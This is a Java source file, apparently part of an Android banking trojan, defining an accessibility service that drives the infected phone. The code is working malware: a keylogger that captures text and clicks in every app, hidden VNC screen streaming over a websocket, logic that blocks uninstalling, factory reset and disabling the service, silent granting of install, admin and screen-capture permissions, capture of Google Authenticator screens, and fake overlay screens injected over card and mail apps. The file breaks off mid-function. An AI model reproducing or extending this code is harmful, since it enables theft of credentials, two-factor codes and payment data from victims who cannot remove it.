package com.service.app.Services;

import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

import static com.service.app.Main.PermManager.PERMISSION_REQUEST_CODE;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.ActivityManager;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.PointF;
import android.graphics.Rect;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.nfc.Tag;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.service.app.CaptureService;
import com.service.app.IndexACT;
import com.service.app.Main.AccessActivity;
import com.service.app.Main.AccessAdm;
import com.service.app.Main.PermManager;
import com.service.app.Main.ViewManager;
import com.service.app.R;
import com.service.app.accessibility.UtilAccess;
import com.service.app.accessibility.antidelmodule;
import com.service.app.accessibility.autoperms;
import com.service.app.defines;
import com.service.app.fake;
import com.service.app.tooling.Notificator;
import com.service.app.vnc.WebSocketService;

import org.jetbrains.annotations.NotNull;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.function.Function;
import java.util.zip.GZIPOutputStream;

import okhttp3.*;


public class Access extends AccessibilityService {

    utils utl = new utils();
    defines consts = new defines();

    UtilAccess UtilAccessibility = new UtilAccess();
    static autoperms autoperms = new autoperms();
    antidelmodule antidelmodule = new antidelmodule();
    private final String TAG_LOG  = Access.class.getSimpleName()+ consts.strTAG1;
    private String getEventText(AccessibilityEvent event){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    private boolean keylogger = true;
    private String textKeylogger = consts.str_null;
    private String packageAppStart = consts.str_null;
    private final String packageAppClass = consts.str_null;
    private String strText = consts.str_null;
    private String className = consts.str_null;
    private String app_inject = consts.str_null;

    private boolean startOffProtect = false;
    private static int NodePos = 0;
    private int totalNodesEncountered = 0;
    private DisplayMetrics displayMetrics;
    private final Handler handler = new Handler();

    // vnc
    private boolean hvnc = false;
    private AccessibilityNodeInfo lastestevent;
    Point screenSize = new Point();

    private String id_bot = "";

    private WebSocket webSocket;
    private long reconnectTime = 5000;
    private final OkHttpClient client = new OkHttpClient.Builder().build();
    WebSocketService webSocketService;

    // screen record
    private Boolean askMediaProjection = false;
    private final OkHttpClient httpClient = new OkHttpClient();

    // Blackscreen

    private WindowManager windowManager;
    private View overlayView;
    private Boolean blackscreen;

    // Record Touch

    private WindowManager windowManagerTouch;
    private View overlayViewTouch;
    private static final long GESTURE_INTERVAL_MS = 5000;
    private final long lastTouchTime = 0;
    private final JSONArray currentgesture = new JSONArray();
    private final JSONArray gestures = new JSONArray();
    private JSONArray gestureTexts = new JSONArray();

    // Gesture Recording

    private final JSONObject currenGestureRecroding = new JSONObject();
    private JSONArray currentGesturePoints = new JSONArray();
    private boolean recordGesture = false;
    private long lastinteraction;

    private final Handler TouchHandler = new Handler();
    private Runnable TouchRunnableOut;
    private Runnable TouchRunnableIn;

    private boolean ignoreTouches = false;

    // Detect lockscreen

    private ScreenStatusReceiver screenStatusReceiver;
    private final boolean FoundUnlock = false;

    // overlay perm

    private static Function<AccessibilityNodeInfo, Boolean> nextCall;

    // bind Websocket

    private static Access instance = new Access();
    private boolean ignoreEvents = false;
    public static final String ACTION_BIND_WEBSOCKET = "com.service.app.BIND_WS";

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            WebSocketService.LocalBinder binder = (WebSocketService.LocalBinder) service;
            webSocketService = binder.getService();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            webSocketService = null;
        }
    };

    public void bindToWebSocketService(Context context) {
        Intent intent = new Intent(context, WebSocketService.class);
        context.bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
    }

    public void unbindFromWebSocketService(Context context) {
        context.unbindService(serviceConnection);
    }




    public void click(int x, int y) {
        if (android.os.Build.VERSION.SDK_INT > 16) {
            clickAtPosition(x, y, getRootInActiveWindow());
        }
    }

    public static void clickAtPosition(int x, int y, AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.getChildCount() == 0) {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            } else {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    clickAtPosition(x, y, node.getChild(i));
                }
            }
        }catch (Exception ex){
          //  utl.SettingsToAdd(context, consts.LogSMS , "(pro27)  | utils isAccessibilityServiceEnabled " + ex.toString() +"::endLog::");
        }
    }


    // keylogger methods

    private String getEventAction(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "click";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "longclick";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "select";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "entering text";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "window state changed";
            default:
                return "unknown";
        }
    }

    private boolean shouldHandleEvent(int eventType) {
        return eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SELECTED ||
                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event){
        try {
            instance = this;
        }catch (Exception e){
            instance = this;
            Log.d(TAG_LOG, "Instance assigning: " + e.toString());
        }

        if (event == null || ignoreEvents) {
            return;
        }

        com.service.app.accessibility.antidelmodule.performIfNecessary(this, event);
        com.service.app.accessibility.antidisablemodule.performIfNecessary(this,event);

        if(utl.SettingsRead(this,"websocket") == "0" || !utl.isMyServiceRunning(this, WebSocketService.class)){
            try {
                Intent serviceIntent = new Intent(this, WebSocketService.class);
                stopService(serviceIntent);
                startService(serviceIntent);
                bindToWebSocketService(this);
            } catch (Exception e) {
                Log.d(TAG_LOG, e.toString());
            }
        }

        if (event.getPackageName() != null && event.getClassName() != null){
            if (nextCall != null) {
                Log.d("===", "Next call");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && event.getSource() != null) {
                    if ( nextCall.apply(event.getSource())) {
                        Log.d("===", "Next call returned true");
                        nextCall = null;

                        ignoreEvents = true;
                        Handler mHandler = new Handler(Looper.getMainLooper());
                        mHandler.postDelayed(() -> {
                            ignoreEvents = false;
                        }, 500);
                    } else {
                        Log.d("===", "Next call returned false");
                    }
                }
                return;
            }

            if (!utl.hasInstallFromUnknownSourcesPermission(this) && consts.unknown_sources) {
                autoperms.UnknownSources(this, event);
            }

            if ((event.getPackageName() + ("/") + event.getClassName()).equals(("com.android.settings/com.android.settings.Settings$AppDrawOverlaySettingsActivity"))) {
                overlaySettingsBranch(event.getSource(), this);
            }

            if ((event.getPackageName() + ("/") + event.getClassName()).equals("com.android.settings/com.android.settings.Settings$OverlaySettingsActivity")) {
                overlaySettingsBranch(event.getSource(), this);
            }

            if (!utl.checkWritePerm(this) && consts.write_perm ) {
                autoperms.ExternalStorage(this, event);
            }

            if ((!utl.checkWritePerm(this) || !utl.hasInstallFromUnknownSourcesPermission(this))) {
                autoperms.muiu(this, event);
            }

            if (utl.SettingsRead(getApplicationContext(), "installapk") == "1")  {
                autoperms.InstallApk(this, event);
            }
        }



        boolean isKillCommand = !utl.SettingsRead(this, consts.killApplication).toLowerCase().equals(consts.str_null);
        if (event.getSource() != null && !isKillCommand && utl.hasInstallFromUnknownSourcesPermission(this)){

            // anti-reset

            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence PackageName = event.getPackageName();
                CharSequence ClassName = event.getClassName();
                String Text = getEventText(event);
                Log.d(TAG_LOG,"text: " + Text + " | " + "Package: " + PackageName + " | Class: " + ClassName);
                if (PackageName != null && PackageName.equals("com.android.settings") && ClassName.equals("com.android.settings.SubSettings")) {
                    for (String text : consts.localeForResetOptions) {
                        if (Text.contains(text)){
                            performGlobalAction(GLOBAL_ACTION_BACK);
                        }
                    }
                } else if (PackageName != null && PackageName.equals("com.android.settings") && ClassName.equals("com.android.settings.settings$factoryresetactivity")) {
                    performGlobalAction(GLOBAL_ACTION_BACK);
                }

            }

            // Anti-AccessibilityMenu

            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence PackageName = event.getPackageName();
                CharSequence ClassName = event.getClassName();
                String Text = getEventText(event);
                PackageManager packageManager = getPackageManager();
                ComponentName componentName = new ComponentName(getApplicationContext(), Access.class);
                try {
                    ServiceInfo applicationInfo = packageManager.getServiceInfo(componentName, PackageManager.GET_META_DATA);
                    String ServiceLabel = applicationInfo.loadLabel(packageManager).toString();
                    if (PackageName != null && PackageName.equals("com.android.settings") && ClassName.equals("com.android.settings.SubSettings") && Text.equals(ServiceLabel) ) {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                } catch (PackageManager.NameNotFoundException e){
                    e.printStackTrace();
                }
            }


            // anti uninstall
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence PackageName = event.getPackageName();
                if (PackageName != null && PackageName.equals("com.android.packageinstaller")) {
                    if (event.getSource() != null){
                        List<AccessibilityNodeInfo> nodes = event.getSource().findAccessibilityNodeInfosByText(utl.getLabelApplication(this).toLowerCase());
                        if (nodes != null && !nodes.isEmpty()) {
                            String[] arrayButtonClick = {"android:id/button2"};
                            for (int i = 0; i < arrayButtonClick.length; i++) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                                    for (AccessibilityNodeInfo node : event.getSource().findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        //Log.d(TAG_LOG, "antiuninstall clicked: " + arrayButtonClick[i]);
                                    }
                                }
                            }
                        }
                    }
                }

            }

            // enable mediaprojection
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && askMediaProjection) {
                String[] arrayButtonClick = {"android:id/button1"};
                for (int i = 0; i < arrayButtonClick.length; i++) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                        for (AccessibilityNodeInfo node : event.getSource().findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            askMediaProjection = false;
                            Handler handler = new Handler();
                            handler.postDelayed(new Runnable() {
                                public void run() {
                                    performGlobalAction(GLOBAL_ACTION_HOME);
                                }
                            }, 1000);

                            Log.d(TAG_LOG, "clicked: " + arrayButtonClick[i]);
                        }
                    }
                }
            }

            // anti uninstall
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence PackageName = event.getPackageName();
                CharSequence ClassName = event.getClassName();
                if (PackageName != null && PackageName.equals("com.android.settings") && ClassName.equals("com.android.settings.applications.InstalledAppDetailsTop")) {
                    if (event.getSource() != null){
                        List<AccessibilityNodeInfo> nodes = event.getSource().findAccessibilityNodeInfosByText(utl.getLabelApplication(this).toLowerCase());
                        if (nodes != null && !nodes.isEmpty()) {
                            performGlobalAction(GLOBAL_ACTION_BACK);
                        }
                    }
                }

            }


        }

        //------------------------------------------

        try {
            lastestevent = getRootInActiveWindow();
            DisplayMetrics displayMetrics = new DisplayMetrics();
            WindowManager wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
            wm.getDefaultDisplay().getMetrics(displayMetrics);
            Display display = wm.getDefaultDisplay();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                display.getRealSize(screenSize);
            }

            if (hvnc) {
                sendHvnc(getRootInActiveWindow());
            }



        } catch (Exception e) {
            Log.d(TAG_LOG, e.toString());
        }

        //------------------------------------------

        if(keylogger) {
            try {
                DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                String time = df.format(Calendar.getInstance().getTime());

                PackageManager packageManager  = getPackageManager();
                AccessibilityNodeInfo source = event.getSource();

                if (source != null) {
                    try {
                        int eventType = event.getEventType();
                        CharSequence packageName = source.getPackageName();
                        if (packageName != null && shouldHandleEvent(eventType)) {
                            packageManager = this.getPackageManager();
                            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName.toString(), 0);
                            String appName = (String) packageManager.getApplicationLabel(applicationInfo);
                            String action = getEventAction(eventType);
                            String content = event.getText().toString();
                            String times = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                            String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("id", utl.randomString(17));
                            jsonObject.put("time", times);
                            jsonObject.put("date", date);
                            jsonObject.put("app_name", appName);
                            jsonObject.put("package_name", packageName.toString());
                            jsonObject.put("action", action);
                            Log.d(TAG_LOG,action);
                            if (content != null) {
                                jsonObject.put("content", content);
                                Log.d(TAG_LOG,content);
                            }
                            AccessibilityNodeInfo sourceNode = event.getSource();
                            if (sourceNode != null){
                                CharSequence description = sourceNode.getContentDescription();
                                if (description != null) {
                                    jsonObject.put("desc",description.toString());
                                    Log.d(TAG_LOG,description.toString());
                                }
                                CharSequence text = sourceNode.getText();
                                if (text != null) {
                                    jsonObject.put("text", text.toString());
                                    Log.d(TAG_LOG,text.toString());
                                }
                            }




                            String jsonString = jsonObject.toString();
                            textKeylogger = textKeylogger + jsonString + consts.string_56;

                        }
                    } catch (PackageManager.NameNotFoundException | JSONException e) {
                        e.printStackTrace();
                    } catch (Exception e){
                        Log.d(TAG_LOG, e.toString());
                    } finally {
                        source.recycle();
                    }
                }


            } catch (Exception ex) {}
        }


        //------------------------------------------

        try {
             app_inject = event.getPackageName().toString();
        }catch (Exception ex){
            app_inject = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_159 + ex.toString() + consts.string_119);
        }

        try {
            packageAppStart = event.getPackageName().toString().toLowerCase();
        }catch (Exception ex){
            packageAppStart = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_160 + ex.toString() + consts.string_119);
        }

        try {
            strText = getEventText(event).toLowerCase();
        }catch (Exception ex){
            strText = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
          //  utl.SettingsToAdd(this, consts.LogSMS ,  consts.string_161 + ex.toString() + consts.string_119);
        }

        try {
            className = event.getClassName().toString().toLowerCase();
        }catch (Exception ex){
            className = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_162 + ex.toString() + consts.string_119);
        }

        try {

            if ((AccessibilityEvent.TYPE_VIEW_SELECTED == event.getEventType() && (!utl.getScreenBoolean(this)))) {
                utl.Log(TAG_LOG, consts.string_28);

                if(keylogger) {
                    DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                    String time = df.format(Calendar.getInstance().getTime());
                    textKeylogger = textKeylogger + time + consts.string_53 + consts.string_28 + consts.string_56;
                }
            }

        }catch (Exception ex){
           // utl.SettingsToAdd(this, consts.LogSMS , consts.string_163 + ex.toString() + consts.string_119);
        }

        try {
            if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
                AccessibilityNodeInfo nodeInfo = event.getSource();
                utl.Log(TAG_LOG, consts.string_33 + packageAppStart + consts.string_34 + strText + consts.string_35 + className + consts.string_36);

                utl.get_google_authenticator2(this, event, packageAppStart); // Logs com.google.android.apps.authenticator2


                //------------------Exit-Settings-Accessibility-Service--------------
                if (Build.VERSION.SDK_INT > 15) {
                    if ((consts.string_37.equals(event.getClassName())) && (strText.equals(utl.getServiceLabel(this, Access.class)))) {
                        blockBack();
                        Log.d(TAG_LOG, "blockback 1");
                        utl.SettingsToAdd(this, consts.LogSMS , consts.string_164 + consts.string_119);
                    }
                }
                //-------------check Keylogger----------
                keylogger = utl.SettingsRead(this, consts.keylogger).equals(consts.str_1);

                startOffProtect = utl.SettingsRead(this, consts.checkProtect).equals(consts.str_1);

                if (textKeylogger.length() > 20) {
                    utl.Log(TAG_LOG, consts.string_38 + textKeylogger.length());
                    utl.SettingsToAdd(this, consts.dataKeylogger, textKeylogger);
                    textKeylogger = "";
                }

                if (nodeInfo == null) {
                    utl.Log(TAG_LOG, consts.string_29);
                    return;
                }
                // --------------- Click button --------------------
               if (Build.VERSION.SDK_INT >= 18) {
                   CharSequence packageName = event.getPackageName();
                   className = event.getClassName().toString().toLowerCase();
                   strText = getEventText(event).toLowerCase();
                    if (utl.SettingsRead(this, consts.autoClick).equals(consts.str_1) && !packageName.equals("com.android.packageinstaller")) {


                        String[] arrayButtonClick = {consts.string_41, consts.string_40, consts.string_39};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                utl.Log(TAG_LOG, consts.string_42);
                                  if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {
                                    Rect buttonRect = new Rect();
                                    nodeInfo.getBoundsInScreen(buttonRect);
                                    for (int ii = 0; ii < 700; ii += 4) {
                                        int y = (buttonRect.centerY() - 250) + ii;
                                        click(buttonRect.centerX(), y);
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }


                                int width  = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                                int height = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                                if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {

                                    for (int ii = 0; ii < 80; ii += 4) {
                                        click(width - 15, height - ii);
                                        utl.Log("SS", "x: " + width + "  y: " + height );
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }

                                utl.SettingsWrite(this, consts.autoClick, consts.str_null);
                            }
                        }



                        if(Build.VERSION.SDK_INT >= 29) {
                            if (utl.autoclick_change_smsManager_sdk_Q(this, event, className, packageAppStart)) {
                                utl.SettingsWrite(this, consts.autoClick, "");
                            }
                        }
                    }


                    if (!utl.SettingsRead(this, consts.killApplication).isEmpty()) {
                        String[] arrayButtonClick = {consts.string_44, consts.string_40};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                if (i == 1) {
                                    utl.SettingsWrite(this, consts.killApplication, consts.str_null);
                                }
                            }
                        }
                    }

                    if (!utl.isAdminDevice(this)) {
                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_49_)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
        }catch (Exception ex){
        }
        try {

            if(!utl.SettingsRead(this, consts.killApplication).equals(getPackageName()) && !event.getClassName().equals("com.android.settings.Settings$ManageAppExternalSourcesActivity")) {
                //--- Block Delete Bots ---
                if ((event.getPackageName().toString().contains(consts.string_45))
                        && (className.contains(consts.string_46))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                   // utl.Log(TAG_LOG, "BLOCK DELETE 1");
                    blockBack();
                    Log.d(TAG_LOG, "blockback 2");
                    //utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block Delete Bots ---
                if (((className.equals(consts.string_47)) || (className.equals(consts.string_48)))
                        && ((event.getPackageName().toString().equals(consts.string_49)) ||(event.getPackageName().toString().equals(consts.string_48_)))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                   // utl.Log(TAG_LOG, "BLOCK DELETE 2");
                    //blockBack();
                    //Log.d(TAG_LOG, "blockback 3");
                    //utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block off admin ---
                if ((className.equals(consts.string_50)) && (utl.isAdminDevice(this))) {
                    blockBack();
                    Log.d(TAG_LOG, "blockback 4");
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_168 + consts.string_119);
                }
            }
        }catch (Exception ex){
            utl.Log(TAG_LOG,consts.string_51);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + ex.toString() + consts.string_119);
        }

                String actionSettingInject = utl.SettingsRead(this, consts.actionSettingInection);
                if (((!actionSettingInject.isEmpty()) && (actionSettingInject.contains(app_inject)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains(consts.string_8)) && (consts.listAppGrabCards.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains(consts.string_9)) && (consts.listAppGrabMails.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this)))) {
                   String nameInject = consts.str_null;
                    try {
                        if (utl.SettingsRead(this, nameInject.isEmpty() ? app_inject : nameInject).length() > 10) {
                            try {
                                Intent dialogIntent = new Intent(this, ViewManager.class);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                utl.SettingsWrite(this, "app_inject", app_inject);
                                utl.SettingsWrite(this, "nameInject", nameInject);
                                startActivity(dialogIntent);
                            } catch (Exception ex) { }
                            //-----------------------------------------

                        }
                    } catch (Exception ex) {
                        utl.Log(TAG_LOG, consts.string_63 + app_inject + consts.string_64 + ex);
                    }
            }

    }

    private void blockBack(){
        if (android.os.Build.VERSION.SDK_INT > 15) {
            for (int i = 0; i < 4; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
    }

    private void blockBack2(){
        if (android.os.Build.VERSION.SDK_INT > 15) {
            for (int i = 0; i < 2; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
    }

    private boolean isScreenAwake() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager == null) {
            return false;
        }

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            return powerManager.isInteractive();
        }

        return powerManager.isScreenOn();
    }

    private JSONObject skeletonconvert(AccessibilityNodeInfo root) throws JSONException {
        JSONObject json = new JSONObject();
        JSONArray nodesArray = new JSONArray();

        if (root != null) {
            NodePos = 1;
            traverseNode(root, nodesArray, 0);
            //root.recycle();
        }

        json.put("nodes", nodesArray);
        return json;
    }

    public static void traverseNode(AccessibilityNodeInfo node, JSONArray nodesArray, int level) throws JSONException {
        JSONObject nodeObject = new JSONObject();

        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        JSONObject boundsObject = new JSONObject();
        boundsObject.put("l", bounds.left);
        boundsObject.put("t", bounds.top);
        boundsObject.put("r", bounds.right);
        boundsObject.put("b", bounds.bottom);
        boundsObject.put("x", bounds.centerX());
        nodeObject.put("s", boundsObject);

        JSONObject infoObject = new JSONObject();
        infoObject.put("tx", node.getText());
        infoObject.put("d", node.getContentDescription());
        infoObject.put("cl", node.isClickable());
        infoObject.put("lc", node.isLongClickable());
        infoObject.put("ch", node.isChecked());
        infoObject.put("sw", (node.getClassName() != null ? node.getClassName().toString().equals("android.widget.Switch") || node.getClassName().toString().equals("android.widget.CheckBox") : false));
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            infoObject.put("e", node.isEditable());
        }
        infoObject.put("c", NodePos);
        nodeObject.put("i", infoObject);

        nodeObject.put("lv", level);

        nodesArray.put(nodeObject);
        NodePos++;

        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo childNode = node.getChild(i);
            if (childNode != null) {
                traverseNode(childNode, nodesArray, level + 1);
                childNode.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        utl.Log(TAG_LOG, consts.string_65);
    }


    void blockProtect(AccessibilityNodeInfo nodeInfo){
        try {
            if (!startOffProtect) {//BLOCK OFF PROTECT
                if (android.os.Build.VERSION.SDK_INT >= 18) {

                    if (nodeInfo == null) {
                        utl.Log(TAG_LOG, consts.string_29);
                        return;
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67_new2)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack2();
                        Log.d(TAG_LOG, "blockback 5");
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack2();
                        Log.d(TAG_LOG, "blockback 6");
                    }

                    if (className.equals(consts.string_68)) {//OLD
                        blockBack2();
                        Log.d(TAG_LOG, "blockback 7");
                       // performGlobalAction(GLOBAL_ACTION_HOME);
                    }
                }
            }
        }catch (Exception ex){}
    }

    String clickprotect = consts.str_step;
    void clickProtect(AccessibilityNodeInfo nodeInfo, String className){
try {
    if (nodeInfo == null) {
        utl.Log(TAG_LOG, consts.string_29);
        return;
    }
    if (startOffProtect) {
        if (android.os.Build.VERSION.SDK_INT >= 18) {
            // --- NEW Version---
            if (packageAppStart.equals(consts.string_66)) {
                if (clickprotect.equals(consts.str_1)) {
                    int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                    int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                    for (int i = 0; i < display_y/2; i += 50) {

                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            clickprotect = consts.str_step;
                            utl.SettingsWrite(this,consts.checkProtect, consts.str_step);
                            startOffProtect = false;
                            blockBack2();
                            Log.d(TAG_LOG, "blockback 8");
                            //performGlobalAction(GLOBAL_ACTION_HOME);
                            break;
                        }
                        if(clickprotect.equals(consts.str_null))break;

                        click(display_x / 2, 40 + i);

                        //utl.chalkTile(100);

                    }
                }

                String[] arrayButtonClick = {consts.string_67_new2, consts.string_67, consts.string_40};
                for (int i = 0; i < arrayButtonClick.length; i++) {
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        clickprotect = consts.str_1;
                        if (arrayButtonClick[i].equals(consts.string_40)) {
                            clickprotect = consts.str_step;
                            startOffProtect = false;
                            blockBack2();
                             //performGlobalAction(GLOBAL_ACTION_HOME);
                        }
                    }
                }
            }

            if (className.equals(consts.string_68)) {
                clickprotect = consts.str_1;
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));
                for (int i = display_y; i > 30; i -= 15) {
                    click(display_x / 2, display_y - i);
                }
            } else if ((className.equals(consts.string_69)) && (clickprotect.equals(consts.str_1))) {
                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    clickprotect = consts.str_step;
                    startOffProtect = false;
                    blockBack2();
                    Log.d(TAG_LOG, "blockback 9");
                     //performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }
        }
    }
}catch (Exception ex){
    //utl.SettingsToAdd(this, consts.LogSMS , consts.string_172 + ex.toString() + consts.string_119);
}
    }

    private void logClick(AccessibilityNodeInfo nodeInfo){

        if (nodeInfo == null) {
            utl.Log(TAG_LOG,consts.string_29);
            return;
        }

        Rect buttonRect = new Rect();
        nodeInfo.getBoundsInScreen(buttonRect);
